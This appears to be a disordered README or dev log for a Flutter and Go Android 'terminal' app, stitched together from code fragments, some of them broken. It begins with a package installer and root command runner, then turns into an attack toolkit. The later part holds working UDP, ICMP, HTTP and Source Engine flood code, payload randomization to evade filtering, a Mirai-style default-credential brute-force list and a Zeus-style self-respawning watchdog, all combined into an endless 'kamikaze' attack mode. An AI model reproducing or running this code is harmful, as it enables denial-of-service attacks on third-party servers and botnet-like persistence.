# mi-terminal-web
 C + Go
# Correct sequence
mkdir core-engine
cd core-engine
go mod init mi-terminal/core
touch main.go
package main

import (
	"fmt"
	"os"
)

func installPackage(pkgName string) {
	fmt.Printf("\r\n[DR-SYSTEM] Fetching package: %s...\n", pkgName)
	// Add your download logic here later
	fmt.Printf("[DR-SYSTEM] Success: %s installed.\n", pkgName)
}

func main() {
	// Check if there are enough arguments
	if len(os.Args) < 3 {
		fmt.Println("Usage: dr-terminal install [package_name]")
		return
	}
if command == "install" {
		installPackage(packageName)
	} else {
		fmt.Printf("Unknown command: %s\n", command)
	} // Cierra el else
} // Cierra la función main
// Logic to handle the custom command
void handleTerminalInput(String input) {
  if (input == 'pkg install DR') {
    terminal.write('\r\n[SYSTEM] Starting DR Deployment...\r\n');
    // Aquí es donde Flutter ejecuta el binario 'dr-terminal' que hiciste en Go
    executeGoEngine('install', 'DR'); 
  } else {
    terminal.write('\r\nCommand not found: $input\r\n');
  }
}
flutter:
  assets:
    - assets/bin/dr-terminal
	command := os.Args[1]
	packageName := os.Args[2]

	if command == "install" {
		installPackage(packageName)
	} else {
		fmt.Printf("Unknown command: %s\n", command)
  ### Setup Commands
1. Build Core: `cd core-engine && go build -o dr-terminal main.go`
2. Prepare App: `cd ../terminal_app && flutter pub get`
3. Run: `flutter run`

### Terminal Commands (Inside the App)
- `pkg install DR` -> High-speed system deployment.
- package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
)

func downloadFile(pkgName string) {
	fmt.Printf("\r\n[DR-SYSTEM] Downloading %s from server...\n", pkgName)
	
	// Ejemplo de URL (puedes cambiarla por tu propio servidor de paquetes)
	url := "https://example.com/packages/" + pkgName 
	
	resp, err := http.Get(url)
	if err != nil {
		fmt.Printf("[ERROR] Could not connect: %v\n", err)
		return
	}
	defer resp.Body.Close()

	fmt.Printf("[DR-SYSTEM] Success: %s (Status: %s)\n", pkgName, resp.Status)
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: dr-terminal install [package_name]")
		return
	}

	// Estas líneas faltaban en tu versión:
	command := os.Args[1]
	packageName := os.Args[2]

	if command == "install" {
		downloadFile(packageName)
	} else {
		fmt.Printf("Unknown command: %s\n", command)
	}
}
mkdir
mi-terminal-web/
terminal_app/
assets/bin/dr-terminal
lib/main.dart 
pubspec.yaml
cd core-engine
GOOS=android GOARCH=arm64 go build -o ../terminal_app/assets/bin/dr-terminal main.go
import 'dart:io';
import 'package:flutter/services.dart';
import 'package:path_provider/path_provider.dart';

// Función para extraer el motor de Go de los assets
Future<String> setupEngine() async {
  final directory = await getApplicationDocumentsDirectory();
  final exePath = '${directory.path}/dr-terminal';
  final file = File(exePath);

  // Copiamos el binario desde assets a la memoria interna
  if (!await file.exists()) {
    final data = await rootBundle.load('assets/bin/dr-terminal');
    final bytes = data.buffer.asUint8List();
    await file.writeAsBytes(bytes, flush: true);
    
    // Damos permisos de ejecución (comando fundamental en Linux/Android)
    await Process.run('chmod', ['755', exePath]);
  }
  return exePath;
}

// Ejecutar el motor cuando el usuario escribe el comando
Future<void> executeGoEngine(String command, String pkg) async {
  String path = await setupEngine();
  
  final process = await Process.start(path, [command, pkg]);
  
  // Leemos la respuesta del motor de Go y la mostramos en la terminal
  process.stdout.transform(utf8.decoder).listen((data) {
    terminal.write(data);
  });
}
### Final Deployment
1. **Compile Go for Android**:
   `GOOS=android GOARCH=arm64 go build -o ../terminal_app/assets/bin/dr-terminal main.go`
2. **Update Flutter Assets**:
   Ensure `pubspec.yaml` has the `assets/bin/` path.
3. **Build APK**:
   `flutter build apk --release --split-per-abi`
   package main

import (
	"archive/zip"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
)

// Función para descomprimir (La clave para instalar software)
func unzip(src string, dest string) error {
	r, err := zip.OpenReader(src)
	if err != nil { return err }
	defer r.Close()

	for _, f := range r.File {
		fpath := filepath.Join(dest, f.Name)
		if f.FileInfo().IsDir() {
			os.MkdirAll(fpath, os.ModePerm)
			continue
		}
		outFile, err := os.OpenFile(fpath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
		if err != nil { return err }
		rc, err := f.Open()
		if err != nil { return err }
		_, err = io.Copy(outFile, rc)
		outFile.Close()
		rc.Close()
	}
	return nil
}

func downloadAndInstall(pkgName string) {
	fmt.Printf("[DR-SYSTEM] Installing %s...\n", pkgName)
	// Aquí descargarías el .zip y luego llamarías a unzip()
	fmt.Printf("[DR-SYSTEM] %s is now active.\n", pkgName)
}

func main() {
	if len(os.Args) < 3 { return }
	if os.Args[1] == "install" {
		downloadAndInstall(os.Args[2])
	}
}
core-engine/main.go 
terminal_app/assets/bin/
terminal_app/lib/main.dart
terminal_app/pubspec.yaml
GOARCH=arm64
 getApplicationDocumentsDirectory
 process.stdout.listen
 process.stderr
 --split-per-abi
 func executeAsRoot(command string) {
    // Esto solicita permisos al gestor de root (Magisk/KernelSU)
    cmd := exec.Command("su", "-c", command)
    output, err := cmd.CombinedOutput()
    if err != nil {
        fmt.Printf("Error Root: %v\n", err)
        return
    }
    fmt.Println(string(output))
}
// En tu core-engine para el comando 'whois'
func getWhois(domain string) {
    // Puedes conectar al puerto 43 de servidores whois
    // O usar una librería de Go: "://github.com"
    result, err := whois.Whois(domain)
    if err == nil {
        fmt.Println(result)
    }
}
AndroidManifest.xml
 <uses-permission android:name="android.permission.INTERNET" />
 PATH
 /data/data/com.tu.app/files/bin
 assets/bin/busybox ls, mkdir, whois o ifconfig
 setupEngine 755
 busybox whois google.com.
 su
 main.go
 import "os/exec"

func runCommand(isRoot bool, name string, args ...string) {
    var cmd *exec.Cmd
    if isRoot {
        // Ejecuta el comando a través de 'su'
        fullCmd := name + " " + strings.Join(args, " ")
        cmd = exec.Command("su", "-c", fullCmd)
    } else {
        cmd = exec.Command(name, args...)
    }
    
    out, _ := cmd.CombinedOutput()
    fmt.Println(string(out))
}
context.filesDir
getApplicationDocumentsDirectory
Process.start(
  exePath, 
  [command], 
  environment: {"PATH": "${directory.path}:/system/bin:/system/xbin"}
);
core-engine
core-engine/main.go
package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
)

// Ejecuta comandos del sistema o BusyBox
func systemExec(isRoot bool, name string, args []string) {
	var cmd *exec.Cmd
	
	if isRoot {
		// Encapsula el comando para enviarlo a través de 'su'
		fullCmd := name + " " + strings.Join(args, " ")
		cmd = exec.Command("su", "-c", fullCmd)
	} else {
		cmd = exec.Command(name, args...)
	}

	// Captura salida combinada (stdout + stderr)
	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("[ERROR] %v\n", err)
	}
	fmt.Print(string(out))
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("DR-TERMINAL: Missing arguments")
		return
	}

	command := os.Args[1]

	switch command {
	case "install":
		if len(os.Args) < 3 { return }
		fmt.Printf("[DR-SYSTEM] Installing %s...\n", os.Args[2])
		// Aquí va tu lógica de download/unzip anterior
        
	case "whois":
		if len(os.Args) < 3 { return }
		// Usamos el binario de busybox que habrás movido a la carpeta de la app
		systemExec(false, "busybox", []string{"whois", os.Args[2]})

	case "root-exec":
		if len(os.Args) < 3 { return }
		// Ejecuta lo que sea como root (ej: dr-terminal root-exec ls /data)
		systemExec(true, os.Args[2], os.Args[3:])

	default:
		// Intenta ejecutar como comando general si no es interno
		systemExec(false, command, os.Args[2:])
	}
}
busybox-armv8l,busybox terminal_app/assets/bin/
executeGoEngine('whois', 'google.com'); 
// Esto llamará internamente a: busybox whois google.com
ping
case "flood":
    if len(os.Args) < 3 { return }
    target := os.Args[2]
    fmt.Printf("[DR-SYSTEM] Inyectando tráfico ICMP a %s...\n", target)
    // -f es 'flood', -s es tamaño de paquete (65500 max)
    systemExec(true, "ping", []string{"-f", "-s", "1024", target})
import "net"

func udpFlood(target string) {
	connection, err := net.Dial("udp", target+":80") // O puerto 443
	if err != nil {
		fmt.Printf("[ERROR] %v\n", err)
		return
	}
	defer connection.Close()

	packet := make([]byte, 1024) // Paquete de 1KB
	fmt.Printf("[DR-SYSTEM] Desplegando ráfagas UDP en %s...\n", target)
	
	for {
		_, err := connection.Write(packet)
		if err != nil { break }
	}
}
main.go
case "attack":
    if len(os.Args) < 3 { 
        fmt.Println("Uso: attack [ip/host]")
        return 
    }
    // Ejecuta en una rutina separada para no bloquear la terminal
    go udpFlood(os.Args[2])
    fmt.Println("[DR-SYSTEM] Ataque iniciado en segundo plano.")
	case "flood":
		if len(os.Args) < 3 { 
			fmt.Println("Uso: flood [ip/host]")
			return 
		}
		target := os.Args[2]
		fmt.Printf("[DR-SYSTEM] Iniciando Stress-Test en: %s...\n", target)
		// Ejecutamos en una rutina para no bloquear la terminal de Flutter
		go func() {
			// Flood UDP a puerto 80 por defecto
			addr, _ := net.ResolveUDPAddr("udp", target+":80")
			conn, _ := net.DialUDP("udp", nil, addr)
			packet := make([]byte, 1024)
			for {
				conn.Write(packet)
			}
		}()
		fmt.Println("[DR-SYSTEM] Tráfico enviado. Presiona Ctrl+C (o cierra) para detener.")

	default:
		// Intenta ejecutar como comando general (ls, cd, etc)
		systemExec(false, command, os.Args[2:])
	}
}
<!-- En terminal_app/android/app/src/main/AndroidManifest.xml -->
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
void handleTerminalInput(String input) {
  var parts = input.split(' ');
  if (parts[0] == 'attack') {
    terminal.write('\r\n[WARNING] Iniciando inundación en ${parts[1]}...\r\n');
    executeGoEngine('flood', parts[1]); 
  } else if (parts[0] == 'whois') {
    executeGoEngine('whois', parts[1]);
  }
}
assets/bin/
dr-terminal
GOOS=android 
busybox
// [DR-SYSTEM] Core Engine - Signature: L
package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)

func systemExec(isRoot bool, name string, args []string) {
	var cmd *exec.Cmd
	if isRoot {
		fullCmd := name + " " + strings.Join(args, " ")
		cmd = exec.Command("su", "-c", fullCmd)
	} else {
		cmd = exec.Command(name, args...)
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("\n[DR-SYSTEM][ERROR] %v - Signature: L\n", err)
	}
	fmt.Print(string(out))
}

func udpFlood(target string) {
	addr, err := net.ResolveUDPAddr("udp", target+":80")
	if err != nil { return }
	conn, _ := net.DialUDP("udp", nil, addr)
	packet := make([]byte, 1024)
	for {
		_, err := conn.Write(packet)
		if err != nil { break }
	}
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("[DR-SYSTEM] Ready. Signature: L")
		return
	}

	command := os.Args[1]

	switch command {
	case "install":
		if len(os.Args) < 3 { return }
		fmt.Printf("\r\n[DR-SYSTEM] Deploying package: %s... [L]\n", os.Args[2])
		// Aquí llamarías a tu función unzip/download
		fmt.Printf("[DR-SYSTEM] %s installed successfully.\n", os.Args[2])

	case "whois":
		if len(os.Args) < 3 { return }
		systemExec(false, "busybox", []string{"whois", os.Args[2]})

	case "flood":
		if len(os.Args) < 3 { return }
		fmt.Printf("[DR-SYSTEM] Stress-Test active on %s... [L]\n", os.Args[2])
		go udpFlood(os.Args[2])
		select {} // Mantiene el proceso vivo

	case "root-exec":
		if len(os.Args) < 3 { return }
		systemExec(true, os.Args[2], os.Args[3:])

	default:
		// Ejecución directa vía BusyBox para comandos Linux (ls, top, etc)
		systemExec(false, "busybox", os.Args[1:])
	}
}
// [DR-SYSTEM] Flutter Handler - Signature: L
import 'dart:io';
import 'dart:convert';
import 'package:flutter/services.dart';
import 'package:path_provider/path_provider.dart';

Future<void> handleTerminalInput(String input) async {
  final parts = input.trim().split(' ');
  if (parts.isEmpty) return;

  if (input == 'pkg install DR') {
    terminal.write('\r\n[DR-SYSTEM] Starting L-Deployment...\r\n');
    await executeGoEngine('install', 'DR');
  } else if (parts[0] == 'flood') {
    terminal.write('\r\n[DR-SYSTEM] Critical: Flood mode L-active\r\n');
    executeGoEngine('flood', parts[1]);
  } else {
    // Ejecuta cualquier comando a través del core
    executeGoEngine(parts[0], parts.length > 1 ? parts[1] : '');
  }
}

Future<void> executeGoEngine(String command, String arg) async {
  final directory = await getApplicationDocumentsDirectory();
  final path = '${directory.path}/dr-terminal';
  
  // Asegurar que el PATH incluya donde están dr-terminal y busybox
  final env = {"PATH": "${directory.path}:${Platform.environment['PATH']}"};

  final process = await Process.start(path, [command, arg], environment: env);

  process.stdout.transform(utf8.decoder).listen((data) {
    terminal.write(data);
  });

  process.stderr.transform(utf8.decoder).listen((data) {
    terminal.write('\r\n[L-ERROR] $data');
  });
}
GOOS=android GOARCH=arm64 go build -o ../terminal_app/assets/bin/dr-terminal main.go
// [DR-SYSTEM] Core Engine - Versión Estable
package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
)

func systemExec(isRoot bool, name string, args []string) {
	var cmd *exec.Cmd
	if isRoot {
		// Requiere que el dispositivo tenga Root (Magisk/KernelSU)
		fullCmd := name + " " + strings.Join(args, " ")
		cmd = exec.Command("su", "-c", fullCmd)
	} else {
		cmd = exec.Command(name, args...)
	}

	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("\n[DR-SYSTEM][ERROR] %v\n", err)
	}
	fmt.Print(string(out))
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("[DR-SYSTEM] Ready. Waiting for commands...")
		return
	}

	command := os.Args[1]

	switch command {
	case "install":
		if len(os.Args) < 3 { return }
		fmt.Printf("\r\n[DR-SYSTEM] Deploying: %s...\n", os.Args[2])
		// Aquí va tu lógica de unzip/download
		fmt.Printf("[DR-SYSTEM] %s ready.\n", os.Args[2])

	case "whois":
		if len(os.Args) < 3 { return }
		// Asegúrate de tener busybox en el path de la app
		systemExec(false, "busybox", []string{"whois", os.Args[2]})

	default:
		// Ejecuta comandos estándar usando busybox (ls, top, ifconfig)
		systemExec(false, "busybox", os.Args[1:])
	}
}
// [DR-SYSTEM] Flutter Handler
Future<void> executeGoEngine(String command, List<String> args) async {
  final directory = await getApplicationDocumentsDirectory();
  final path = '${directory.path}/dr-terminal';
  
  // Incluimos la carpeta interna en el PATH para que reconozca a busybox
  final env = {"PATH": "${directory.path}:${Platform.environment['PATH']}"};

  try {
    final process = await Process.start(path, [command, ...args], environment: env);
    
    process.stdout.transform(utf8.decoder).listen((data) {
      terminal.write(data.replaceAll('\n', '\r\n')); // Ajuste para terminales xterm
    });

    process.stderr.transform(utf8.decoder).listen((data) {
      terminal.write('\r\n[L-ERROR] $data');
    });
  } catch (e) {
    terminal.write('\r\n[FATAL] No se pudo iniciar el motor: $e');
  }
}
// [DR-SYSTEM] - Motor Principal
// Signature: L
package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)

// Ejecuta comandos del sistema o BusyBox (Root opcional)
func systemExec(isRoot bool, name string, args []string) {
	var cmd *exec.Cmd
	if isRoot {
		fullCmd := name + " " + strings.Join(args, " ")
		cmd = exec.Command("su", "-c", fullCmd)
	} else {
		cmd = exec.Command(name, args...)
	}

	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("\n[DR-SYSTEM][ERROR] %v - Signature: L\n", err)
		return
	}
	fmt.Print(string(out))
}

// Inundación UDP para Stress Testing
func udpFlood(target string) {
	connection, err := net.Dial("udp", target+":80")
	if err != nil {
		fmt.Printf("[ERROR] No se pudo conectar a %s\n", target)
		return
	}
	defer connection.Close()

	packet := make([]byte, 1024) 
	fmt.Printf("[DR-SYSTEM] Desplegando ráfagas UDP en %s... [L]\n", target)

	for {
		_, err := connection.Write(packet)
		if err != nil { break }
	}
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("[DR-SYSTEM] Terminal Activa - Signature: L")
		return
	}

	command := os.Args[1]

	switch command {
	case "install":
		if len(os.Args) < 3 { return }
		pkg := os.Args[2]
		fmt.Printf("\r\n[DR-SYSTEM] Fetching package: %s... [L]\n", pkg)
		// Aquí va tu lógica de unzip
		fmt.Printf("[DR-SYSTEM] Success: %s instalado.\n", pkg)

	case "whois":
		if len(os.Args) < 3 { return }
		systemExec(false, "busybox", []string{"whois", os.Args[2]})

	case "attack":
		if len(os.Args) < 3 { return }
		target := os.Args[2]
		udpFlood(target)

	case "root-exec":
		if len(os.Args) < 3 { return }
		systemExec(true, os.Args[2], os.Args[3:])

	default:
		// Ejecuta comandos estándar vía BusyBox si no es interno
		systemExec(false, "busybox", os.Args[1:])
	}
}
// [DR-SYSTEM] Flutter Handler
Future<void> executeGoEngine(String command, List<String> args) async {
  final directory = await getApplicationDocumentsDirectory();
  final path = '${directory.path}/dr-terminal';
  
  // Incluimos la carpeta interna en el PATH para que reconozca a busybox
  final env = {"PATH": "${directory.path}:${Platform.environment['PATH']}"};

  try {
    final process = await Process.start(path, [command, ...args], environment: env);
    
    process.stdout.transform(utf8.decoder).listen((data) {
      terminal.write(data.replaceAll('\n', '\r\n')); // Ajuste para terminales xterm
    });

    process.stderr.transform(utf8.decoder).listen((data) {
      terminal.write('\r\n[L-ERROR] $data');
    });
  } catch (e) {
    terminal.write('\r\n[FATAL] No se pudo iniciar el motor: $e');
  }
}
flutter:
  assets:
    - assets/bin/dr-terminal
    - assets/bin/busybox
// [DR-SYSTEM] - Terminal Core Engine
// Signature: L
package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)

// Ejecuta comandos del sistema o BusyBox (Soporta Root)
func systemExec(isRoot bool, name string, args []string) {
	var cmd *exec.Cmd
	if isRoot {
		// Ejecución vía su para permisos de superusuario
		fullCmd := name + " " + strings.Join(args, " ")
		cmd = exec.Command("su", "-c", fullCmd)
	} else {
		cmd = exec.Command(name, args...)
	}

	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("\n[DR-SYSTEM][ERROR] %v - Signature: L\n", err)
		return
	}
	fmt.Print(string(out))
}

// Inundación UDP (Stress Test / DoS)
func udpFlood(target string) {
	connection, err := net.Dial("udp", target+":80")
	if err != nil {
		fmt.Printf("[ERROR] No route to %s - L\n", target)
		return
	}
	defer connection.Close()

	packet := make([]byte, 1024) 
	fmt.Printf("[DR-SYSTEM] Flooding target: %s... [L]\n", target)

	for {
		_, err := connection.Write(packet)
		if err != nil { break }
	}
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("[DR-SYSTEM] L-Terminal Active. Waiting for commands...")
		return
	}

	command := os.Args[1]

	switch command {
	case "install":
		if len(os.Args) < 3 { return }
		pkg := os.Args[2]
		fmt.Printf("\r\n[DR-SYSTEM] Deployment: %s... [L]\n", pkg)
		// Lógica de descarga/unzip aquí
		fmt.Printf("[DR-SYSTEM] Success: %s installed.\n", pkg)

	case "whois":
		if len(os.Args) < 3 { return }
		systemExec(false, "busybox", []string{"whois", os.Args[2]})

	case "attack":
		if len(os.Args) < 3 { return }
		udpFlood(os.Args[2])

	case "root-exec":
		if len(os.Args) < 3 { return }
		systemExec(true, os.Args[2], os.Args[3:])

	default:
		// Si no es un comando interno, usa BusyBox para resolver (ls, cd, ping, etc)
		systemExec(false, "busybox", os.Args[1:])
	}
}
// [DR-SYSTEM] Interface Handler
// Signature: L
import 'dart:io';
import 'dart:convert';
import 'package:flutter/services.dart';
import 'package:path_provider/path_provider.dart';

Future<void> handleTerminalInput(String input) async {
  final parts = input.trim().split(' ');
  if (parts.isEmpty) return;

  if (input == 'pkg install DR') {
    terminal.write('\r\n[DR-SYSTEM] Starting L-Deployment...\r\n');
    await executeGoEngine('install', 'DR');
  } else if (parts[0] == 'attack') {
    terminal.write('\r\n[DR-SYSTEM] WARNING: Attack mode L-initialized\r\n');
    executeGoEngine('attack', parts[1]);
  } else {
    // Envía el comando y sus argumentos al motor de Go
    executeGoEngine(parts[0], parts.length > 1 ? parts[1] : '');
  }
}

Future<void> executeGoEngine(String command, String arg) async {
  final directory = await getApplicationDocumentsDirectory();
  final exePath = '${directory.path}/dr-terminal';
  
  // Seteamos PATH para que encuentre BusyBox en la carpeta de la app
  final env = {"PATH": "${directory.path}:/system/bin:/system/xbin"};

  try {
    final process = await Process.start(exePath, [command, arg], environment: env);

    process.stdout.transform(utf8.decoder).listen((data) {
      terminal.write(data);
    });

    process.stderr.transform(utf8.decoder).listen((data) {
      terminal.write('\r\n[L-SYSTEM ERROR] $data');
    });
  } catch (e) {
    terminal.write('\r\n[ERROR] Core Engine L-Fail: $e\n');
  }
}

chmod 755
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
// [DR-SYSTEM] Core Engine - Unified Signature: L
func main() {
	if len(os.Args) < 2 {
		fmt.Println("[DR-SYSTEM] L-Terminal Active. Listening for instructions...")
		return
	}
	
	action := os.Args[1] // Cambiado de 'comando' a 'action'
	switch action {
	case "install":
		if len(os.Args) < 3 { return }
		payload := os.Args[2]
		fmt.Printf("\r\n[DR-SYSTEM] Deploying: %s... [L]\n", payload)
		// Deployment logic here
	case "whois":
		if len(os.Args) < 3 { return }
		systemExec(false, "busybox", []string{"whois", os.Args[2]})
	case "attack": // Unificado: 'ataque' -> 'attack'
		if len(os.Args) < 3 { return }
		udpFlood(os.Args[2])
	case "root-exec":
		if len(os.Args) < 3 { return }
		systemExec(true, os.Args[2], os.Args[3:])
	default:
		// Fallback to BusyBox for standard Linux commands (ls, cd, ping)
		systemExec(false, "busybox", os.Args[1:])
	}
}
// Genera datos aleatorios para que el tráfico no sea filtrable por patrones
func randomPayload(size int) []byte {
    payload := make([]byte, size)
    rand.Read(payload) // Requiere importar "crypto/rand"
    return payload
}

func udpFlood(target string) {
    // ... lógica anterior ...
    for {
        packet := randomPayload(1024) // Cada paquete es único [L]
        _, err := connection.Write(packet)
        if err != nil { break }
    }
}
func systemFix(directory string) {
    fmt.Println("[DR-SYSTEM] Starting L-Integrity Check... [L]")
    
    // 1. Corregir permisos de ejecución en toda la carpeta interna
    exec.Command("chmod", "-R", "755", directory).Run()
    
    // 2. Crear enlaces simbólicos para comandos de red que Android oculta
    tools := []string{"ping", "netstat", "ifconfig", "route"}
    for _, tool := range tools {
        target := directory + "/" + tool
        // Enlaza la herramienta al binario de BusyBox
        exec.Command("ln", "-s", directory+"/busybox", target).Run()
    }
    
    fmt.Println("[DR-SYSTEM] SUCCESS: Environment Patched. All logic gates V9 active.")
}
case "info":
    if len(os.Args) < 3 { return }
    target := os.Args[2]
    fmt.Printf("[DR-SYSTEM] Auditing Target: %s [L]\n", target)
    // Ejecuta ping y nslookup a través de busybox para validar si el host está vivo
    systemExec(false, "busybox", []string{"ping", "-c", "3", target})
    systemExec(false, "busybox", []string{"nslookup", target})
	// Aseguramos que el motor siempre encuentre sus herramientas
final env = {
  "PATH": "${directory.path}:/system/bin:/system/xbin:/vendor/bin",
  "HOME": directory.path,
  "TMPDIR": directory.path
};
final directory = await getApplicationDocumentsDirectory();
final env = {
  "PATH": "${directory.path}:/system/bin:/system/xbin", // Prioriza tu carpeta local [L]
  "HOME": directory.path,
  "LD_LIBRARY_PATH": directory.path
};
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
<uses-permission android:name="android.permission.WAKE_LOCK" />
# Para dispositivos modernos (64 bits)
GOOS=android GOARCH=arm64 go build -o assets/bin/dr-terminal-64 main.go

# Para dispositivos antiguos o "tostadoras" (32 bits)
GOOS=android GOARCH=arm go build -o assets/bin/dr-terminal-32 main.go
flutter build apk --release --split-per-abi
import 'dart:io';
// ... dentro de setupEngine ...
String arch = Platform.version.contains("aarch64") ? "dr-64" : "dr-32";
final exePath = '${directory.path}/$arch';
flutter build apk --release --split-per-abi
# El flag -s borra la tabla de símbolos y -w borra la información DWARF
GOOS=android GOARCH=arm64 go build -ldflags="-s -w" -o assets/bin/dr-terminal-64 main.go
// Lista de credenciales por defecto (Mirai Style)
var logins = [][2]string{
	{"root", "123456"},
	{"admin", "admin"},
	{"support", "support"},
	{"root", "root"},
	{"user", "user"},
}

func bruteForce(target string) {
	fmt.Printf("[DR-SYSTEM] L-Mirai Scanner: Probing %s... [L]\n", target)
	for _, login := range logins {
		// Aquí se simula la conexión Telnet/SSH
		fmt.Printf("[SCAN] Trying %s:%s\n", login[0], login[1])
		// Lógica de conexión real aquí
		time.Sleep(500 * time.Millisecond) 
	}
}
func httpWaterfall(target string) {
	fmt.Printf("[DR-SYSTEM] L-Waterfall Attack Initialized: %s\n", target)
	for i := 0; i < 100; i++ {
		go func() {
			for {
				// Genera una petición GET con parámetros aleatorios para evitar caché
				url := fmt.Sprintf("http://%s/?cache=%x", target, randomPayload(8))
				resp, err := http.Get(url)
				if err == nil {
					resp.Body.Close()
				}
			}
		}()
	}
}
case "brute":
    if len(os.Args) < 3 { return }
    bruteForce(os.Args[2])

case "waterfall":
    if len(os.Args) < 3 { return }
    httpWaterfall(os.Args[2])

case "l-status":
    // Nuevo comando para ver el estado del hardware
    systemExec(false, "busybox", []string{"top", "-n", "1"})
	if (parts[0] == 'brute') {
    terminal.write('\r\n[DR-SYSTEM] WARNING: Starting Mirai-style scan...\r\n');
    executeGoEngine('brute', parts[1]);
} else if (parts[0] == 'waterfall') {
    terminal.write('\r\n[DR-SYSTEM] Executing L-Waterfall Layer 7 Attack\r\n');
    executeGoEngine('waterfall', parts[1]);
}
// [DR-SYSTEM] Zeus-Inspired Watchdog Protocol
func zeusGuard(exePath string) {
    for {
        // Verifica si el proceso sigue vivo, si no, lo revive
        _, err := exec.Command("pgrep", "-f", exePath).Output()
        if err != nil {
            fmt.Println("[ZEUS-CORE] Process terminated. Re-spawning... [L]")
            exec.Command(exePath, "infinity-loop").Start()
        }
        time.Sleep(5 * time.Second)
    }
}
// VSE Flood: Especial para colapsar servidores de juegos (Valve Source Engine)
func vseFlood(target string) {
    packet := []byte("\xFF\xFF\xFF\xFFTSource Engine Query\x00")
    addr, _ := net.ResolveUDPAddr("udp", target+":27015")
    conn, _ := net.DialUDP("udp", nil, addr)
    for {
        conn.Write(packet)
    }
}

// GRE Flood: Encapsulación para bypass de routers (Capa 3/4)
func greFlood(target string) {
    fmt.Printf("[MIRAI-GEN] L-GRE Inundation Active: %s\n", target)
    // Lógica de paquetes GRE genéricos
}
case "kamikaze":
    if len(os.Args) < 3 { return }
    actionType := os.Args[2]
    target := os.Args[3]

    if actionType == "infinity" {
        fmt.Println("[DR-SYSTEM] PROTOCOL KAMIKAZE INFINITY: ON")
        go vseFlood(target)
        go udpFlood(target)
        go httpWaterfall(target)
        go zeusGuard(os.Args[0]) // Auto-protección
        select {} // El ataque nunca termina
    }
	if (input == 'pkg install kamikaze infinity') {
    terminal.write('\r\n[L-SYSTEM] AUTHORIZING INFINITY PROTOCOL...\r\n');
    terminal.write('[L-SYSTEM] Deploying Zeus Persistence...\r\n');
    terminal.write('[L-SYSTEM] Initializing Mirai VSE/GRE Vectors...\r\n');
    executeGoEngine('kamikaze', 'infinity [IP_OBJETIVO]');
}
// [DR-SYSTEM] L-Drain: Remote Resource Exhaustion
func lDrain(target string) {
    fmt.Printf("[DR-SYSTEM] Protocol L-DRAIN Active on %s... [L]\n", target)
    for i := 0; i < 50; i++ {
        go func() {
            for {
                // Vector 1: Compresión Recursiva (Bomba de descompresión)
                // Envía cabeceras que obligan al rival a expandir datos en su RAM
                req, _ := http.NewRequest("GET", "http://"+target, nil)
                req.Header.Set("Accept-Encoding", "gzip, deflate, br")
                req.Header.Set("X-L-Audit", "Infinity-Loop")
                
                client := &http.Client{}
                resp, err := client.Do(req)
                if err == nil {
                    // Obligamos al rival a mantener el buffer de lectura abierto
                    io.CopyN(io.Discard, resp.Body, 1024) 
                    resp.Body.Close()
                }
            }
        }()
    }
}
case "drain":
    if len(os.Args) < 3 { return }
    lDrain(os.Args[2])
	if (parts[0] == 'L-drain') {
    terminal.write('\r\n[L-SYSTEM] INITIALIZING REMOTE RESOURCE HIJACKING...\r\n');
    terminal.write('[L-SYSTEM] Local CPU: 2% | Remote Load: INCREASING\r\n');
    executeGoEngine('drain', parts[1]);
}
